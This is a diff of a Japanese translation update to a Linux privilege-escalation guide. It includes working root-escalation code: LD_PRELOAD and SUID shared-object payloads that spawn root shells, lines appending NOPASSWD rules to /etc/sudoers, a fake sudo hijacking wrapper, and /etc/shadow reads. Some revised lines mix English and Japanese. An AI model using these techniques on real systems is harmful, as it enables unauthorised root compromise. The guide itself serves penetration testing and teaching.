+If `sudo -l` shows `env_keep+=PATH` or a `secure_path` containing attacker-writable entries (e.g., `/home/<user>/bin`), any relative command inside the sudo-allowed target can be shadowed.
 
-- 必要条件: sudoルール（多くは`NOPASSWD`）で、絶対パスを使わずにコマンド（`free`, `df`, `ps`など）を呼び出すスクリプト/バイナリを実行し、かつ最初に検索される書き込み可能なPATHエントリが存在すること。
+- 要件: スクリプト/バイナリを実行する sudo ルール（多くは `NOPASSWD`）で、絶対パスを使わずにコマンド（`free`, `df`, `ps` など）を呼び出し、かつ最初に検索される書き込み可能な PATH エントリが存在すること。
 ```bash
 cat > ~/bin/free <<'EOF'
 #!/bin/bash
@@ -914,7 +926,7 @@ sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
 bash -p                                # root shell via SUID bit
 ```
 ### Sudo execution bypassing paths
-**Jump** して他のファイルを読むか、**symlinks** を使います。例えば sudoers ファイルでは: _hacker10 ALL= (root) /bin/less /var/log/\*_
+**Jump** で他のファイルを読むか、**symlinks** を使います。例えば sudoers file では: _hacker10 ALL= (root) /bin/less /var/log/\*_
 ```bash
 sudo less /var/logs/anything
 less>:e /etc/shadow #Jump to read other files using privileged less
@@ -924,50 +936,50 @@ less>:e /etc/shadow #Jump to read other files using privileged less
 ln /etc/shadow /var/log/new
 sudo less /var/log/new #Use symlinks to read any file
 ```
-もし**wildcard**が使われている場合（\*）、さらに簡単です:
+もし **wildcard** が使用されている (\*), さらに簡単です:
 ```bash
 sudo less /var/log/../../etc/shadow #Read shadow
 sudo less /var/log/something /etc/shadow #Red 2 files
 ```
 **対策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)
 
-### Sudo command/SUID binary（コマンドパスが指定されていない場合）
+### Sudo command/SUID binary にコマンドのパスが指定されていない場合
 
-もし単一のコマンドに対して **sudo permission** が **パスを指定せずに** 与えられている場合: _hacker10 ALL= (root) less_、PATH変数を変更することでこれを悪用できます。
+単一のコマンドに対して **sudo 権限** が **パスを指定せずに** 与えられている場合（例: _hacker10 ALL= (root) less_）、PATH 変数を変更することで悪用できます。
 ```bash
 export PATH=/tmp:$PATH
 #Put your backdoor in /tmp and name it "less"
 sudo less
 ```
-この手法は、**suid** バイナリが**パスを指定せずに別のコマンドを実行する場合（怪しい SUID バイナリの内容は常に _**strings**_ で確認してください）**にも使用できます。
+この手法は、**suid** バイナリが**パスを指定せずに別のコマンドを実行する（奇妙な SUID バイナリの内容は必ず** _**strings**_ **で確認してください）**場合にも使用できます。
 
 [Payload examples to execute.](payloads-to-execute.md)
 
-### SUID バイナリ（コマンドのパスが指定されている場合）
+### SUID binary でコマンドのパスが指定されている場合
 
-もし**suid** バイナリが**パスを指定して別のコマンドを実行する**場合は、suid ファイルが呼び出すコマンド名と同じ名前の関数を**エクスポート**してみることができます。
+もし**suid** バイナリが**パスを指定して別のコマンドを実行している**場合、suidファイルが呼び出すコマンド名で**export a function**を作成してエクスポートしてみてください。
 
-例えば、もし suid バイナリが _**/usr/sbin/service apache2 start**_ を呼び出している場合、関数を作成してそれをエクスポートしてみてください:
+例えば、もし suid バイナリが _**/usr/sbin/service apache2 start**_ を呼び出している場合、関数を作成してエクスポートしてみてください：
 ```bash
 function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
 export -f /usr/sbin/service
 ```
-その後、suidバイナリを呼び出すと、この関数が実行されます
+その後、suid バイナリを呼び出すと、この関数が実行されます
 
 ### LD_PRELOAD & **LD_LIBRARY_PATH**
 
-The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.
+**LD_PRELOAD** 環境変数は、ローダーが他のすべてのライブラリ（標準 C ライブラリ (`libc.so`) を含む）より前に読み込む、1つまたは複数の共有ライブラリ（.so ファイル）を指定するために使用されます。このプロセスはライブラリのプリロードとして知られています。
 
-しかし、この機能が悪用されるのを防ぎ、システムのセキュリティを維持するために、特に **suid/sgid** 実行ファイルに関して、システムはいくつかの条件を強制します：
+しかし、システムのセキュリティを維持し、この機能が特に **suid/sgid** 実行ファイルで悪用されるのを防ぐために、システムはいくつかの条件を適用します:
 
-- ローダは、リアルユーザーID (_ruid_) がエフェクティブユーザーID (_euid_) と一致しない実行ファイルに対して **LD_PRELOAD** を無視します。
-- suid/sgid を持つ実行ファイルの場合、プリロードされるのは標準パスにあり、かつ suid/sgid を持つライブラリのみです。
+- ローダーは、real user ID (_ruid_) が effective user ID (_euid_) と一致しない実行ファイルに対して **LD_PRELOAD** を無視します。
+- **suid/sgid** を持つ実行ファイルに対しては、標準パスにあり、かつ suid/sgid になっているライブラリのみがプリロードされます。
 
-権限昇格は、`sudo` でコマンドを実行する権限があり、かつ `sudo -l` の出力に **env_keep+=LD_PRELOAD** が含まれている場合に発生する可能性があります。この設定により、`sudo` でコマンドを実行しても **LD_PRELOAD** 環境変数が保持され認識されるため、任意のコードが昇格した権限で実行される可能性があります。
+権限昇格は、`sudo` でコマンドを実行する権限があり、`sudo -l` の出力に **env_keep+=LD_PRELOAD** が含まれている場合に発生することがあります。この設定により、`sudo` でコマンドが実行されても **LD_PRELOAD** 環境変数が維持されて認識されるため、昇格した権限で任意のコードが実行される可能性があります。
 ```
 Defaults        env_keep += LD_PRELOAD
 ```
-次のファイルに保存: **/tmp/pe.c**
+ファイル名を **/tmp/pe.c** として保存
 ```c
 #include <stdio.h>
 #include <sys/types.h>
@@ -980,17 +992,17 @@ setuid(0);
 system("/bin/bash");
 }
 ```
-次に、**それをコンパイル**するには:
+次に、**それをコンパイルする**には、次を使用します:
 ```bash
 cd /tmp
 gcc -fPIC -shared -o pe.so pe.c -nostartfiles
 ```
-最後に、**escalate privileges** を実行する
+最後に、**escalate privileges** を実行して
 ```bash
 sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
 ```
 > [!CAUTION]
-> 同様のprivescは、攻撃者が**LD_LIBRARY_PATH**環境変数を制御している場合に悪用され得る。攻撃者はライブラリが検索されるパスを制御できるためだ。
+> 攻撃者が **LD_LIBRARY_PATH** 環境変数を制御している場合、同様の privesc が悪用され得ます。なぜなら、ライブラリが検索されるパスを攻撃者が制御できるからです。
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -1012,13 +1024,13 @@ sudo LD_LIBRARY_PATH=/tmp <COMMAND>
 ```
 ### SUID Binary – .so injection
 
-異常に見える **SUID** 権限の付いた binary に遭遇した場合、**.so** ファイルを正しくロードしているかを確認するのが良い習慣です。次のコマンドを実行して確認できます:
+異常に見える**SUID**権限を持つバイナリに遭遇したら、**.so**ファイルを適切に読み込んでいるか確認するのが良い習慣です。以下のコマンドで確認できます:
 ```bash
 strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
 ```
-例えば、_"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ のようなエラーに遭遇すると、悪用の可能性が示唆されます。
+例えば、_"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_に遭遇した場合、これは悪用の可能性を示唆します。
 
-これを悪用するには、_"/path/to/.config/libcalc.c"_ のような C ファイルを作成し、次のコードを含めます:
+これを悪用するには、次のコードを含むCファイル、例えば_"/path/to/.config/libcalc.c"_を作成します:
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -1029,13 +1041,13 @@ void inject(){
 system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
 }
 ```
-このコードは、コンパイルして実行すると、ファイルのパーミッションを操作し、権限昇格した shell を実行することで権限を昇格させることを目的としています。
+このコードは、コンパイルして実行すると、ファイルのパーミッションを操作して権限を昇格させ、昇格した権限でシェルを実行することを目的としています。
 
-上記の C ファイルを共有オブジェクト (.so) ファイルにコンパイルするには、次のようにします:
+上記の C file を shared object (.so) ファイルにコンパイルするには:
 ```bash
 gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
 ```
-最後に、影響を受けたSUIDバイナリを実行するとエクスプロイトが発動し、システムの侵害につながる可能性があります。
+最後に、影響を受けた SUID バイナリを実行すると exploit がトリガーされ、システムの侵害が発生する可能性があります。
 
 ## Shared Object Hijacking
 ```bash
@@ -1047,7 +1059,7 @@ something.so => /lib/x86_64-linux-gnu/something.so
 readelf -d payroll  | grep PATH
 0x000000000000001d (RUNPATH)            Library runpath: [/development]
 ```
-SUID binaryが、我々が書き込めるフォルダからlibraryをロードしていることがわかったので、そのフォルダに必要な名前でlibraryを作成しましょう:
+書き込み可能なフォルダから library を読み込む SUID binary を見つけたので、そのフォルダに必要な名前の library を作成しましょう:
 ```c
 //gcc src.c -fPIC -shared -o /development/libshared.so
 #include <stdio.h>
@@ -1064,13 +1076,13 @@ system("/bin/bash -p");
 ```shell-session
 ./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
 ```
-つまり、生成したライブラリには `a_function_name` という関数が必要になります。
+つまり、生成したライブラリは `a_function_name` という名前の関数を持っている必要があります。
 
 ### GTFOBins
 
-[**GTFOBins**](https://gtfobins.github.io) は、攻撃者がローカルのセキュリティ制限を回避するために悪用できる Unix バイナリをまとめたキュレーションされたリストです。[**GTFOArgs**](https://gtfoargs.github.io/) は同様のプロジェクトで、コマンドに対して**引数のみを注入できる**場合のケースに特化しています。
+[**GTFOBins**](https://gtfobins.github.io) は、攻撃者がローカルのセキュリティ制限を回避するために悪用できる Unix バイナリを精選したリストです。[**GTFOArgs**](https://gtfoargs.github.io/) は同様のプロジェクトで、コマンドに対して**引数のみを注入できる**ケースを対象としています。
 
-このプロジェクトは、Unix バイナリの正規の機能を収集しており、それらは restricted shells からの脱出、権限昇格または昇格状態の維持、ファイル転送、bind and reverse shells の生成、その他の post-exploitation タスクの遂行に悪用できます。
+このプロジェクトは、制限されたシェルからの脱出、特権昇格や維持、ファイル転送、bind および reverse シェルの生成、そしてその他の post-exploitation tasks を支援するために悪用できる Unix バイナリの正当な機能を収集しています。
 
 > gdb -nx -ex '!sh' -ex quit\
 > sudo mysql -e '! /bin/sh'\
@@ -1089,60 +1101,61 @@ https://gtfoargs.github.io/
 
 ### FallOfSudo
 
-`sudo -l` にアクセスできる場合、ツール [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) を使用して任意の sudo ルールを悪用する方法が見つかるか確認できます。
+`sudo -l` にアクセスできる場合、ツール [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) を使って、sudo のルールを悪用できる方法を見つけられるかどうかを確認できます。
 
-### Reusing Sudo Tokens
+### Sudo トークンの再利用
 
-パスワードは分からないが **sudo access** を持っている場合、**sudo コマンドの実行を待ち、そのセッショントークンをハイジャックする**ことで権限を昇格できます。
+パスワードは知らないが **sudo access** がある場合、**sudo コマンドの実行を待ってセッショントークンをハイジャックする**ことで特権を昇格させることができます。
 
-権限昇格の要件:
+特権昇格の要件:
 
-- 既にユーザー "_sampleuser_" としてシェルを持っている
-- "_sampleuser_" は **`sudo` を使用して** 過去 **15mins** に何かを実行していること（デフォルトでは、これはパスワードなしで `sudo` を使える sudo token の有効期間です）
+- あなたは既にユーザー "_sampleuser_" としてシェルを持っています
+- "_sampleuser_" が **`sudo` を使用して** 過去**15分以内**に何かを実行している（デフォルトでは、それがパスワードを入力せずに `sudo` を使用できる sudo トークンの有効期間です）
 - `cat /proc/sys/kernel/yama/ptrace_scope` が 0 であること
-- `gdb` が利用可能であること（アップロードできる）
+- `gdb` にアクセスできること（アップロード可能であること）
 
-(一時的に `ptrace_scope` を有効化するには `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope`、恒久的には `/etc/sysctl.d/10-ptrace.conf` を修正して `kernel.yama.ptrace_scope = 0` を設定します)
+（`ptrace_scope` を一時的に有効化するには `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` を実行するか、`/etc/sysctl.d/10-ptrace.conf` を恒久的に修正して `kernel.yama.ptrace_scope = 0` を設定します）
 
-これらの要件がすべて満たされていれば、**次を使って権限を昇格できます：** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)
+これらの要件がすべて満たされている場合、**次のツールを使って特権を昇格できます：** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)
 
-- 最初の **exploit** (`exploit.sh`) はバイナリ `activate_sudo_token` を _/tmp_ に作成します。これを使ってセッション内の sudo token を **有効化** できます（自動的に root シェルにはならないので、`sudo su` を実行してください）：
+- 最初の**exploit**（`exploit.sh`）はバイナリ `activate_sudo_token` を _/tmp_ に作成します。これを使って**セッション内の sudo トークンを有効化**できます（自動的に root シェルは得られないので、`sudo su` を実行してください）：
 ```bash
 bash exploit.sh
 /tmp/activate_sudo_token
 sudo su
 ```
-- **second exploit** (`exploit_v2.sh`) は _/tmp_ に sh shell を作成し、**root 所有で setuid が設定されます**
+- **2番目の exploit** (`exploit_v2.sh`) は _/tmp_ に **root 所有で setuid を持つ** sh shell を作成します
 ```bash
 bash exploit_v2.sh
 /tmp/sh -p
 ```
-- **3番目の exploit** (`exploit_v3.sh`) は **sudoers file を作成し**、**sudo tokens を永続化し、全ユーザーが sudo を使用できるようにします**
+- The **third exploit** (`exploit_v3.sh`) は **sudoers file を作成し**、**sudo tokens を永続化して全ユーザーが sudo を使用できるようにします**
 ```bash
 bash exploit_v3.sh
 sudo su
 ```
 ### /var/run/sudo/ts/\<Username>
 
-フォルダやフォルダ内に作成されたファイルのいずれかに対して**write permissions**がある場合、バイナリ [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) を使って **create a sudo token for a user and PID** することができます。\
-例えば、ファイル _/var/run/sudo/ts/sampleuser_ を上書きでき、PID 1234 のそのユーザーとして shell を持っている場合、パスワードを知らなくても次のようにして **obtain sudo privileges** できます:
+フォルダまたはフォルダ内に作成されたファイルのいずれかに**書き込み権限**がある場合、バイナリ[**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools)を使用して**ユーザーと PID のための sudo token を作成**できます。\
+例えば、ファイル _/var/run/sudo/ts/sampleuser_ を上書きでき、そのユーザーとして PID 1234 のシェルを持っている場合、パスワードを知らなくても**sudo privileges**を取得できます。次のように:
 ```bash
 ./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
 ```
 ### /etc/sudoers, /etc/sudoers.d
 
-ファイル `/etc/sudoers` と `/etc/sudoers.d` 内のファイルは、誰が `sudo` を使えるか、またその方法を設定します。これらのファイルは**デフォルトで user root と group root のみが読み取り可能です**。\
-**もし**このファイルを**読む**ことができれば、**興味深い情報を取得できる**可能性があり、任意のファイルに**書き込み**できるなら**escalate privileges**が可能になります。
+The file `/etc/sudoers` and the files inside `/etc/sudoers.d` configure who can use `sudo` and how. These files **by default can only be read by user root and group root**.\
+`/etc/sudoers` と `/etc/sudoers.d` 内のファイルは誰が `sudo` を使えるかとその方法を設定します。これらのファイルは **デフォルトで user root と group root のみが読み取れます**。\
+**もし**このファイルを**読み取れる**なら、**興味深い情報を取得できる可能性があります**。また、任意のファイルに**書き込み**できるなら、**権限昇格**が可能になります。
 ```bash
 ls -l /etc/sudoers /etc/sudoers.d/
 ls -ld /etc/sudoers.d/
 ```
-書き込みができれば、この権限を悪用できます。
+書き込み権限があれば、この権限を悪用できます
 ```bash
 echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
 echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
 ```
-これらの権限を悪用する別の方法：
+これらの権限を悪用する別の方法:
 ```bash
 # makes it so every terminal can sudo
 echo "Defaults !tty_tickets" > /etc/sudoers.d/win
@@ -1151,17 +1164,17 @@ echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
 ```
 ### DOAS
 
-OpenBSD の `doas` のように、`sudo` バイナリの代替はいくつかあります。設定は `/etc/doas.conf` を確認してください。
+`sudo` バイナリの代替として、OpenBSD向けの `doas` などがあります。設定は `/etc/doas.conf` を必ず確認してください。
 ```
 permit nopass demo as root cmd vim
 ```
 ### Sudo Hijacking
 
-もし **ユーザーが通常マシンに接続して `sudo` を使用する** と分かっていて、そのユーザーコンテキストでシェルを取得している場合、**新しい sudo 実行ファイルを作成** して、まず root としてあなたのコードを実行し、その後でユーザーのコマンドを実行させることができます。次に、ユーザーコンテキストの **$PATH を変更**（例えば .bash_profile に新しいパスを追加）して、ユーザーが sudo を実行したときにあなたの sudo 実行ファイルが実行されるようにします。
+もし**ユーザーが通常マシンに接続して `sudo` を使用する**ことで権限を昇格しており、かつそのユーザーコンテキスト内でシェルを得ている場合、root としてあなたのコードを実行しその後ユーザーのコマンドを実行するような**新しい sudo 実行ファイルを作成**できます。次に、**ユーザーコンテキストの $PATH を変更**（例えば新しいパスを .bash_profile に追加）して、ユーザーが sudo を実行したときにあなたの sudo 実行ファイルが実行されるようにします。
 
-ユーザーが別のシェル（bash 以外）を使っている場合は、新しいパスを追加するために別のファイルを修正する必要がある点に注意してください。例えば[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) は `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` を修正します。別の例は [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) にあります。
+ユーザーが別のシェル（bash 以外）を使用している場合は、新しいパスを追加するために他のファイルを変更する必要がある点に注意してください。例えば[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) は `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` を修正します。別の例は [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) にあります。
 
-または次のようなものを実行する：
+あるいは次のように実行する:
 ```bash
 cat >/tmp/sudo <<EOF
 #!/bin/bash
@@ -1180,13 +1193,13 @@ sudo ls
 
 ### ld.so
 
-ファイル `/etc/ld.so.conf` は、**読み込まれる設定ファイルの場所を示します**。通常、このファイルには次のパスが含まれます: `include /etc/ld.so.conf.d/*.conf`
+The file `/etc/ld.so.conf` indicates **読み込まれる設定ファイルの場所を示します**. Typically, this file contains the following path: `include /etc/ld.so.conf.d/*.conf`
 
-つまり、`/etc/ld.so.conf.d/*.conf` の設定ファイルが読み込まれることを意味します。これらの設定ファイルは、**ライブラリが検索される他のフォルダ**を指しています。たとえば、`/etc/ld.so.conf.d/libc.conf` の内容が `/usr/local/lib` の場合、**システムは `/usr/local/lib` をライブラリの検索先として使用します**。
+That means that the configuration files from `/etc/ld.so.conf.d/*.conf` will be read. This configuration files **他のディレクトリを指し** where **ライブラリ** are going to be **検索されます**. For example, the content of `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **This means that the system will search for libraries inside `/usr/local/lib`**.
 
-もし何らかの理由で ` /etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 内の任意のファイル、または `/etc/ld.so.conf.d/*.conf` 内で指定された設定ファイルが参照する任意のフォルダのいずれかに対して**ユーザーが書き込み権限を持っている**場合、権限昇格できる可能性があります。\
+If for some reason **a user has write permissions** on any of the paths indicated: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, any file inside `/etc/ld.so.conf.d/` or any folder within the config file inside `/etc/ld.so.conf.d/*.conf` he may be able to escalate privileges.\
+Take a look at **このミスコンフィギュレーションをどのように悪用するか** in the following page:
 
-以下のページで、**この誤設定を悪用する方法**を確認してください:
 
 {{#ref}}
 ld.so.conf-example.md
@@ -1203,7 +1216,7 @@ linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
 ```
-lib を `/var/tmp/flag15/` にコピーすると、`RPATH` 変数に指定されているとおり、この場所のライブラリがプログラムによって使用されます。
+lib を `/var/tmp/flag15/` にコピーすると、`RPATH` 変数で指定されたとおり、その場所の lib がプログラムで使用されます。
 ```
 level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/
 
@@ -1212,7 +1225,7 @@ linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
 ```
-次に `/var/tmp` に `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` で悪意のあるライブラリを作成します。
+次に、`/var/tmp` に悪意のあるライブラリを次のコマンドで作成します: `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
 ```c
 #include<stdlib.h>
 #define SHELL "/bin/sh"
@@ -1227,9 +1240,8 @@ execve(file,argv,0);
 ```
 ## Capabilities
 
-Linux capabilities はプロセスに対して利用可能な root 権限の**サブセット**を提供します。これは実質的に root の**権限をより小さく識別可能な単位に分割**することを意味します。これらの各単位は個別にプロセスに付与できるため、権限の全体セットが削減され、悪用のリスクが低下します。\
-以下のページを読んで、**capabilities とその悪用方法について詳しく学んでください**:
-
+Linux capabilities は **プロセスに対する利用可能な root 権限のサブセット** を提供します。これは root の **権限をより小さく識別可能な単位に分割** することを効果的に意味します。これらの各単位は個別にプロセスに付与できるため、権限の完全な集合が縮小され、悪用のリスクが低減されます。\
+以下のページを読んで、**capabilities とそれらの悪用方法の詳細を学んでください**：
 
 {{#ref}}
 linux-capabilities.md
@@ -1237,32 +1249,32 @@ linux-capabilities.md
 
 ## Directory permissions
 
-ディレクトリでは、**"execute" ビット**は対象ユーザが "**cd**" できることを意味します。\
-**"read"** ビットはユーザがファイルを**一覧表示**できることを意味し、**"write"** ビットはファイルの**削除**や**作成**ができることを意味します。
+ディレクトリでは、**"execute" ビット** は影響を受けるユーザーが **"cd"** でフォルダに入れることを意味します。\
+**"read"** ビットはユーザーが **"list"** によって **"files"** を一覧できることを意味し、**"write"** ビットはユーザーが **"delete"** および **"create"** によって新しい **"files"** を作成・削除できることを意味します。
 
 ## ACLs
 
-Access Control Lists (ACLs) は任意設定の権限の第二層を表しており、従来の ugo/rwx 権限を**上書きできる**場合があります。これらの権限により、所有者やグループに属さない特定のユーザに対してアクセスを許可または拒否でき、ファイルやディレクトリへのアクセス制御をより細かく行えます。こうした**細かな制御により、より精密なアクセス管理が可能になります**。詳細は[**here**](https://linuxconfig.org/how-to-manage-acls-on-linux)を参照してください。
+Access Control Lists (ACLs) は任意の権限の第2層を表し、**従来の ugo/rwx 権限をオーバーライドすることが可能**です。これらの権限は、所有者でもグループの一員でもない特定のユーザーに対して権利を許可または拒否することで、ファイルやディレクトリへのアクセス制御を強化します。このレベルの **粒度により、より正確なアクセス管理が可能** になります。詳細は [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux) を参照してください。
 
-**Give** user "kali" read and write permissions over a file:
+**付与する** ユーザー "kali" にファイルの読み取りおよび書き込み権限を:
 ```bash
 setfacl -m u:kali:rw file.txt
 #Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)
 
 setfacl -b file.txt #Remove the ACL of the file
 ```
-**取得** システムから特定のACLを持つファイルを取得する:
+**取得する** システムから特定のACLsを持つファイル:
 ```bash
 getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
 ```
-## shell sessions を開く
+## shell セッションを開く
 
-**古いバージョン**では、別のユーザー（**root**）の**shell session**を**hijack**できる場合があります。\
-**最新バージョン**では、**自分のユーザー**の screen sessions のみに**connect**できるようになっています。しかし、**interesting information inside the session**を見つけることがあります。
+**古いバージョン**では、別のユーザー（**root**）のいくつかの**shell**セッションを**hijack**できることがあります.\  
+**最新のバージョン**では、screen セッションには**自分のユーザー**のものにのみ**接続**できます。しかし、**セッション内の興味深い情報**が見つかることがあります。
 
 ### screen sessions hijacking
 
-**screen sessions を一覧表示**
+**screen セッションを一覧表示**
 ```bash
 screen -ls
 screen -ls <username>/ # Show another user' screen sessions
@@ -1277,7 +1289,7 @@ screen -x [user]/[session id]
 ```
 ## tmux sessions hijacking
 
-これは **古い tmux バージョン** による問題でした。非特権ユーザーとして root によって作成された tmux (v2.1) セッションを hijack することはできませんでした。
+これは **古い tmux バージョン** の問題でした。非特権ユーザーとして root によって作成された tmux (v2.1) セッションをハイジャックできませんでした。
 
 **tmux セッションを一覧表示**
 ```bash
@@ -1297,53 +1309,53 @@ rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs c
 # If you are root or devs you can access it
 tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
 ```
-Check **Valentine box from HTB** for an example.
+例として **Valentine box from HTB** を確認してください。
 
 ## SSH
 
 ### Debian OpenSSL Predictable PRNG - CVE-2008-0166
 
-All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
-このバグはこれらのOSで新しい ssh key を作成した際に発生し、**可能なバリエーションが32,768通りしかなかった**ために起こります。つまり、全ての候補を計算でき、**ssh 公開鍵があれば対応する秘密鍵を検索できる**ということです。計算済みの候補はここで見つけられます: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)
+2006年9月から2008年5月13日までの間に Debian ベースのシステム（Ubuntu, Kubuntu, など）で生成されたすべての SSL および SSH キーは、このバグの影響を受けている可能性があります。\
+このバグはこれらの OS で新しい ssh key を作成した際に発生します。なぜなら **可能性はわずか 32,768 通りしかなかった** からです。これはすべての組み合わせを計算できることを意味し、**ssh public key を持っていれば対応する private key を検索できます**。計算済みの組み合わせはここで見つけることができます: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)
 
 ### SSH Interesting configuration values
 
-- **PasswordAuthentication:** Specifies whether password authentication is allowed. The default is `no`.
-- **PubkeyAuthentication:** Specifies whether public key authentication is allowed. The default is `yes`.
-- **PermitEmptyPasswords**: When password authentication is allowed, it specifies whether the server allows login to accounts with empty password strings. The default is `no`.
+- **PasswordAuthentication:** パスワード認証が許可されるかどうかを指定します。デフォルトは `no` です。
+- **PubkeyAuthentication:** 公開鍵認証が許可されるかどうかを指定します。デフォルトは `yes` です。
+- **PermitEmptyPasswords**: パスワード認証が許可されている場合に、サーバが空のパスワード文字列のアカウントでのログインを許可するかどうかを指定します。デフォルトは `no` です。
 
 ### PermitRootLogin
 
-Specifies whether root can log in using ssh, default is `no`. Possible values:
+root が ssh を使ってログインできるかどうかを指定します。デフォルトは `no` です。可能な値:
 
-- `yes`: root can login using password and private key
-- `without-password` or `prohibit-password`: root can only login with a private key
-- `forced-commands-only`: Root can login only using private key and if the commands options are specified
-- `no` : no
+- `yes`: root は password と private key の両方でログインできます
+- `without-password` or `prohibit-password`: root は private key のみでログインできます
+- `forced-commands-only`: root は private key を使用し、かつ commands options が指定されている場合にのみログインできます
+- `no`: 許可しない
 
 ### AuthorizedKeysFile
 
-Specifies files that contain the public keys that can be used for user authentication. It can contain tokens like `%h`, which will be replaced by the home directory. **You can indicate absolute paths** (starting in `/`) or **relative paths from the user's home**. For example:
+ユーザ認証に使用できる public keys を含むファイルを指定します。`%h` のようなトークンを含めることができ、ホームディレクトリに置換されます。**絶対パス**（`/` で始まる）または**ユーザのホームからの相対パス**を指定できます。例えば:
 ```bash
 AuthorizedKeysFile    .ssh/authorized_keys access
 ```
-その設定は、ユーザー「**testusername**」の**private** keyでログインしようとすると、sshがあなたの鍵のpublic keyを`/home/testusername/.ssh/authorized_keys`と`/home/testusername/access`にあるものと比較することを示します。
+その設定は、もしユーザー「**testusername**」の**private**キーでログインしようとした場合、ssh はあなたのキーのpublic key を `/home/testusername/.ssh/authorized_keys` と `/home/testusername/access` にあるものと比較することを示します。
 
 ### ForwardAgent/AllowAgentForwarding
 
-SSH agent forwardingを使うと、サーバー上に（without passphrases!）鍵を置きっぱなしにする代わりに、**use your local SSH keys instead of leaving keys**ことができます。つまり、sshで**jump**して**to a host**し、そこから別のホストへさらに**jump to another**する際に、**initial host**にある**key**を**using**してアクセスできるようになります。
+SSH agent forwarding により、サーバー上に（without passphrases!）鍵を残しておく代わりに、**use your local SSH keys instead of leaving keys** ことができます。つまり、ssh で **to a host** に **jump** し、そこから **initial host** にある **key** を使って別のホストに **jump to another** ことが可能になります。
 
-You need to set this option in `$HOME/.ssh.config` like this:
+このオプションは `$HOME/.ssh.config` に次のように設定する必要があります:
 ```
 Host example.com
 ForwardAgent yes
 ```
-`Host` が `*` に設定されている場合、ユーザーが別のマシンへ切り替えるたびに、そのホストがキーにアクセスできてしまう（これはセキュリティ上の問題）ことに注意してください。
+Notice that if `Host` is `*` every time the user jumps to a different machine, that host will be able to access the keys (which is a security issue).
 
-ファイル `/etc/ssh_config` はこの設定を**上書き**し、この設定を許可または拒否することができます。\\
-ファイル `/etc/sshd_config` はキーワード `AllowAgentForwarding` によって ssh-agent forwarding を**許可**または**拒否**できます（デフォルトは許可）。
+ファイル `/etc/ssh_config` はこの**オプション**を**上書き**でき、この設定を許可または拒否できます。\
+ファイル `/etc/sshd_config` はキーワード `AllowAgentForwarding` で ssh-agent フォワーディングを**許可**または**拒否**できます（デフォルトは許可）。
 
-環境で Forward Agent が設定されていることを確認したら、次のページを参照してください。**悪用して権限昇格できる可能性があります**:
+環境で Forward Agent が設定されているのを見つけたら、次のページを読んでください。**それを悪用して権限を昇格できる可能性があります**：
 
 
 {{#ref}}
@@ -1354,72 +1366,65 @@ ssh-forward-agent-exploitation.md
 
 ### プロファイルファイル
 
-ファイル `/etc/profile` と `/etc/profile.d/` 以下のファイルは、**ユーザーが新しいシェルを起動したときに実行されるスクリプト**です。したがって、それらのいずれかに**書き込みまたは編集できる場合は権限を昇格できます**。
